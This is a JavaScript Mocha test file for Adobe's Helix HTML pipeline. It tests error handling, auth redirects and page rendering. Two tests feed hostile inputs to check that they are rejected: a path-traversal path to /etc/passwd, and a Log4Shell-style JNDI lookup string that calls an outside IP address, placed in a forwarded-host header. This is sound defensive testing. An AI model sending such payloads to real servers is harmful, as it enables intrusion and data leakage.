/*
 * Copyright 2021 Adobe. All rights reserved.
 * This file is licensed to you under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License. You may obtain a copy
 * of the License at http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software distributed under
 * the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR REPRESENTATIONS
 * OF ANY KIND, either express or implied. See the License for the specific language
 * governing permissions and limitations under the License.
 */

/* eslint-env mocha */
import assert from 'assert';
import esmock from 'esmock';
import { exportJWK, generateKeyPair, SignJWT } from 'jose';
import { FileS3Loader } from './FileS3Loader.js';
import {
  htmlPipe, PipelineRequest, PipelineResponse, PipelineState,
} from '../src/index.js';
import { StaticS3Loader } from './StaticS3Loader.js';

describe('HTML Pipe Test', () => {
  it('responds with 404 for invalid path', async () => {
    const resp = await htmlPipe(
      new PipelineState({ path: '/../etc/passwd' }),
      new PipelineRequest(new URL('https://www.hlx.live/')),
    );
    assert.strictEqual(resp.status, 404);
    assert.strictEqual(resp.headers.get('x-error'), 'invalid path');
  });

  it('responds with 400 for invalid xfh', async () => {
    const resp = await htmlPipe(
      new PipelineState({
        log: console,
        s3Loader: new FileS3Loader().status('config-all.json', 404),
        owner: 'adobe',
        repo: 'helix-pages',
        ref: 'super-test',
        partition: 'live',
        path: '/',
      }),
      new PipelineRequest(new URL('https://www.hlx.live/'), {
        headers: {
          // eslint-disable-next-line no-template-curly-in-string
          'x-forwarded-host': '${jndi:dns://3.238.15.214/ORTbVlfjTl}',
        },
      }),
    );
    assert.strictEqual(resp.status, 400);
    // eslint-disable-next-line no-template-curly-in-string
    assert.strictEqual(resp.headers.get('x-error'), 'invalid url: https://${jndi:dns://3.238.15.214/ORTbVlfjTl}/');
  });

  it('responds with 500 for content-bus errors', async () => {
    const resp = await htmlPipe(
      new PipelineState({
        log: console,
        s3Loader: new FileS3Loader().status('index.md', 500),
        owner: 'adobe',
        repo: 'helix-pages',
        ref: 'super-test',
        partition: 'live',
        path: '/',
      }),
      new PipelineRequest(new URL('https://www.hlx.live/')),
    );
    assert.strictEqual(resp.status, 502);
    // eslint-disable-next-line no-template-curly-in-string
    assert.strictEqual(resp.headers.get('x-error'), 'failed to load /index.md from content-bus: 500');
  });

  it('responds with 500 for pipeline errors', async () => {
    /** @type htmlPipe */
    const { htmlPipe: mockPipe } = await esmock('../src/html-pipe.js', {
      '../src/steps/fetch-config.js': () => {
        throw Error('kaputt');
      },
    });

    const resp = await mockPipe(
      new PipelineState({ s3Loader: new FileS3Loader() }),
      new PipelineRequest(new URL('https://www.hlx.live/')),
    );
    assert.strictEqual(resp.status, 500);
    assert.strictEqual(resp.headers.get('x-error'), 'kaputt');
  });

  it('handles /.auth route', async () => {
    const keyPair = await generateKeyPair('RS256');
    const { privateKey, publicKey } = keyPair;
    const env = {
      HLX_ADMIN_IDP_PUBLIC_KEY: JSON.stringify({
        ...await exportJWK(publicKey),
        kid: 'dummy-kid',
      }),
      HLX_ADMIN_IDP_PRIVATE_KEY: JSON.stringify(await exportJWK(privateKey)),
      HLX_SITE_APP_AZURE_CLIENT_ID: 'dummy-clientid',
    };

    const tokenState = await new SignJWT({
      owner: 'owner',
      repo: 'repo',
      contentBusId: 'foo-id',
      // this is our own login redirect, i.e. the current document
      requestPath: '/en',
      requestHost: 'www.hlx.live',
      requestProto: 'https',
    })
      .setProtectedHeader({ alg: 'RS256', kid: 'dummy-kid' })
      .setIssuer('urn:example:issuer')
      .setAudience('dummy-clientid')
      .sign(privateKey);

    const req = new PipelineRequest('https://localhost/.auth', {
      headers: new Map(Object.entries({
        'x-hlx-auth-state': tokenState,
        'x-hlx-auth-code': '1234-code',
      })),
    });

    const resp = await htmlPipe(
      new PipelineState({ env, path: '/.auth', s3Loader: new FileS3Loader() }),
      req,
    );
    assert.strictEqual(resp.status, 302);
    assert.strictEqual(resp.headers.get('location'), `https://www.hlx.live/.auth?state=${tokenState}&code=1234-code`);
  });

  it('handles .auth partition', async () => {
    const resp = await htmlPipe(
      new PipelineState({ partition: '.auth', s3Loader: new FileS3Loader() }),
      new PipelineRequest(new URL('https://www.hlx.live/')),
    );
    assert.strictEqual(resp.status, 401);
    assert.strictEqual(resp.headers.get('x-error'), 'missing state parameter.');
  });

  it('responds with 400 for missing contentBusId', async () => {
    const resp = await htmlPipe(
      new PipelineState({
        owner: 'owner',
        repo: 'repo',
        ref: 'ref',
        s3Loader: new StaticS3Loader()
          .reply(
            'helix-code-bus',
            'owner/repo/ref/helix-config.json',
            new PipelineResponse('{}'),
          ),
      }),
      new PipelineRequest(new URL('https://www.hlx.live/')),
    );
    assert.strictEqual(resp.status, 400);
    assert.strictEqual(resp.headers.get('x-error'), 'contentBusId missing');
  });

  it('serves index.md', async () => {
    const s3Loader = new FileS3Loader();
    const state = new PipelineState({
      log: console,
      s3Loader,
      owner: 'adobe',
      repo: 'helix-pages',
      ref: 'super-test',
      partition: 'live',
      path: '/index.md',
      timer: {
        update: () => { },
      },
    });
    const resp = await htmlPipe(
      state,
      new PipelineRequest(new URL('https://www.hlx.live/')),
    );
    assert.strictEqual(resp.status, 200);
    assert.strictEqual(resp.body, '<!-- this is a test document -->\n# Hello\n\n');
    assert.deepStrictEqual(Object.fromEntries(resp.headers.entries()), {
      'access-control-allow-origin': '*',
      'content-type': 'text/markdown; charset=utf-8',
      'last-modified': 'Fri, 30 Apr 2021 03:47:18 GMT',
      'x-surrogate-key': 'FzT3jXtDSYMYOTq1 foo-id_metadata super-test--helix-pages--adobe_head',
      // this is coming from the config-all/headers
      link: '</scripts/scripts.js>; rel=modulepreload; as=script; crossorigin=use-credentials',
    });
  });

  it('renders /', async () => {
    const s3Loader = new FileS3Loader();
    const state = new PipelineState({
      log: console,
      s3Loader,
      owner: 'adobe',
      repo: 'helix-pages',
      ref: 'super-test',
      partition: 'live',
      path: '/',
      timer: {
        update: () => { },
      },
    });
    const resp = await htmlPipe(
      state,
      new PipelineRequest(new URL('https://www.hlx.live/')),
    );
    assert.strictEqual(resp.status, 200);
    assert.ok(resp.body.includes('<h1 id="hello">Hello</h1>'));
    assert.deepStrictEqual(Object.fromEntries(resp.headers.entries()), {
      'access-control-allow-origin': '*',
      'content-type': 'text/html; charset=utf-8',
      'last-modified': 'Fri, 30 Apr 2021 03:47:18 GMT',
      'x-surrogate-key': 'FzT3jXtDSYMYOTq1 foo-id_metadata super-test--helix-pages--adobe_head',
      // this is coming from the config-all/headers
      link: '</scripts/scripts.js>; rel=modulepreload; as=script; crossorigin=use-credentials',
    });
  });

  it('serves articles.md', async () => {
    const s3Loader = new FileS3Loader();
    const state = new PipelineState({
      log: console,
      s3Loader,
      owner: 'adobe',
      repo: 'helix-pages',
      ref: 'super-test',
      partition: 'live',
      path: '/articles.md',
      timer: {
        update: () => { },
      },
    });
    const resp = await htmlPipe(
      state,
      new PipelineRequest(new URL('https://www.hlx.live/')),
    );
    assert.strictEqual(resp.status, 200);
    assert.strictEqual(resp.body, '# Articles\n');
    assert.deepStrictEqual(Object.fromEntries(resp.headers.entries()), {
      'access-control-allow-origin': '*',
      'content-type': 'text/markdown; charset=utf-8',
      'last-modified': 'Fri, 30 Apr 2021 03:47:18 GMT',
      'x-surrogate-key': 'iQzO-EvK0WKNO_o0 foo-id_metadata super-test--helix-pages--adobe_head',
      // this is coming from the config-all/headers
      link: '</scripts/scripts.js>; rel=modulepreload; as=script; crossorigin=use-credentials',
    });
  });

  it('renders /articles', async () => {
    const s3Loader = new FileS3Loader();
    const state = new PipelineState({
      log: console,
      s3Loader,
      owner: 'adobe',
      repo: 'helix-pages',
      ref: 'super-test',
      partition: 'live',
      path: '/articles',
      timer: {
        update: () => { },
      },
    });
    const resp = await htmlPipe(
      state,
      new PipelineRequest(new URL('https://www.hlx.live/')),
    );
    assert.strictEqual(resp.status, 200);
    assert.ok(resp.body.includes('<h1 id="articles">Articles</h1>'));
    assert.deepStrictEqual(Object.fromEntries(resp.headers.entries()), {
      'access-control-allow-origin': '*',
      'content-type': 'text/html; charset=utf-8',
      'last-modified': 'Fri, 30 Apr 2021 03:47:18 GMT',
      'x-surrogate-key': 'iQzO-EvK0WKNO_o0 foo-id_metadata super-test--helix-pages--adobe_head',
      // this is coming from the config-all/headers
      link: '</scripts/scripts.js>; rel=modulepreload; as=script; crossorigin=use-credentials',
    });
  });

  it('renders static html with selector my-block.selector.html', async () => {
    const s3Loader = new FileS3Loader();
    const state = new PipelineState({
      log: console,
      s3Loader,
      owner: 'adobe',
      repo: 'helix-pages',
      ref: 'super-test',
      partition: 'live',
      path: '/my-block.selector.html',
      timer: {
        update: () => { },
      },
    });
    const resp = await htmlPipe(
      state,
      new PipelineRequest(new URL('https://www.hlx.live/')),
    );
    assert.strictEqual(resp.status, 200);
    assert.strictEqual(resp.body, '<html><body>static</body></html>\n');
    assert.deepStrictEqual(Object.fromEntries(resp.headers.entries()), {
      'access-control-allow-origin': '*',
      'content-type': 'text/html; charset=utf-8',
      'last-modified': 'Fri, 30 Apr 2021 03:47:18 GMT',
      'x-surrogate-key': 'Tl4ey1eS4kJ2iRMt kvcvppnfHtt5omSX foo-id_metadata super-test--helix-pages--adobe_head',
    });
  });
});
